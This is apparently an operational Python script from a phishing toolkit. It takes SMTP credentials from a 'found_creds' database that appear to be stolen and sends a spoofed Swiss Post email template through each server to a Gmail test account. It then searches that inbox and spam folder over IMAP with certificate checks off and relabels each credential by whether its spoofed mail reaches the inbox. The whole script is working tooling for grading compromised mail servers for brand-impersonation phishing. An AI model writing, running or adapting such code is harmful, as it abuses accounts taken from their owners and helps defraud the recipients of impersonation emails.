#!/usr/bin/env python3
"""Fresh IMAP classification test with unique markers + 90s wait."""
import sys, time, sqlite3, uuid, imaplib, ssl
sys.path.insert(0, "/opt/darkvasend")
from auditguard.campaign_sender import send_clean
from auditguard.spoof_templates import get_template
from auditguard.imap_checker import GMAIL_CHECKER

tpl = get_template("swisspost")
checker = GMAIL_CHECKER["email"]
DB = "/opt/darkvasend/bustgo-hunt.db"

db = sqlite3.connect(DB, timeout=10)
db.row_factory = sqlite3.Row
rows = db.execute(
    "SELECT id, smtp_host, smtp_port, smtp_user, smtp_password, context FROM found_creds WHERE auth_ok=1"
).fetchall()

run_id = "NOW-" + uuid.uuid4().hex[:6]
print(f"RUN ID: {run_id}")
print(f"Time: {time.strftime('%H:%M:%S')}")
print(f"Checker: {checker}")
print(f"SMTP: {len(rows)}")

# Phase 1: Send spoof from each SMTP
markers = {}
for r in rows:
    sid = r["id"]
    host = r["smtp_host"]
    smtp_config = {
        "host": host, "port": r["smtp_port"],
        "username": r["smtp_user"], "password": r["smtp_password"],
        "from_email": r["smtp_user"],
    }
    marker = f"{run_id}-{sid}"
    subject = f"{tpl['subject']} [{marker}]"

    print(f"[#{sid}] {host}...", end=" ", flush=True)
    result = send_clean(smtp_config, tpl["from_name"], tpl["from_email"],
                        checker, subject, tpl["html"], tpl.get("reply_to", ""), None)
    if result["success"]:
        markers[sid] = {"host": host, "marker": marker}
        print("SENT", flush=True)
    else:
        print(f"FAIL({result.get('error', '')})", flush=True)
    time.sleep(0.3)

print(f"\nSent: {len(markers)} markers")
print("Waiting 90 seconds for delivery...", flush=True)
time.sleep(90)

# Phase 2: Check IMAP
print("\nChecking IMAP...", flush=True)
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

for attempt in range(3):
    imap = imaplib.IMAP4_SSL("imap.gmail.com", 993, ssl_context=ctx, timeout=20)
    imap.login(checker, GMAIL_CHECKER["password"])

    for sid, info in markers.items():
        if "result" in info:
            continue
        marker = info["marker"]

        # Check INBOX
        imap.select("INBOX", readonly=True)
        search_q = f'SUBJECT "{marker}"'
        status, msg_ids = imap.search(None, search_q)
        if status == "OK" and msg_ids[0] and msg_ids[0].strip():
            info["result"] = "INBOX"
            continue

        # Check SPAM
        imap.select("[Gmail]/Spam", readonly=True)
        status, msg_ids = imap.search(None, search_q)
        if status == "OK" and msg_ids[0] and msg_ids[0].strip():
            info["result"] = "SPAM"
            continue

    imap.logout()

    remaining = [s for s, i in markers.items() if "result" not in i]
    if not remaining:
        break
    if attempt < 2:
        print(f"Retry {attempt+2}/3... {len(remaining)} not found yet", flush=True)
        time.sleep(15)

# Results
print("\n" + "=" * 50)
print(f"RESULTATS FRAIS (run {run_id}):")
print("=" * 50)
for sid, info in sorted(markers.items()):
    result = info.get("result", "NOT_FOUND")
    print(f"  #{sid} {info['host']} -> {result}")

inbox_ids = [sid for sid, info in markers.items() if info.get("result") == "INBOX"]
spam_ids = [sid for sid, info in markers.items() if info.get("result") == "SPAM"]
nf_ids = [sid for sid, info in markers.items() if info.get("result", "NOT_FOUND") == "NOT_FOUND"]
print(f"\nINBOX: {len(inbox_ids)} {inbox_ids}")
print(f"SPAM: {len(spam_ids)} {spam_ids}")
print(f"NOT FOUND: {len(nf_ids)} {nf_ids}")

# Phase 3: Update DB labels
print("\nUpdating DB labels...")
for sid, info in markers.items():
    result = info.get("result")
    if not result or result == "NOT_FOUND":
        continue
    row = db.execute("SELECT context FROM found_creds WHERE id=?", (sid,)).fetchone()
    old_ctx = row["context"] if row else ""
    label = old_ctx.replace("Manual: ", "")
    for pfx in ["SPOOF_INBOX_", "SPOOF_SPAM_", "BASIQUE_INBOX_", "BASIQUE_SPAM_", "SPOOF_", "BASIQUE_", "STRIP_"]:
        if label.startswith(pfx):
            label = label[len(pfx):]
            break
    if result == "INBOX":
        new_ctx = f"Manual: SPOOF_INBOX_{label}"
    else:
        new_ctx = f"Manual: SPOOF_SPAM_{label}"
    db.execute("UPDATE found_creds SET context=? WHERE id=?", (new_ctx, sid))
    print(f"  #{sid} {old_ctx} -> {new_ctx}")

db.commit()
db.close()
print("\nDONE")
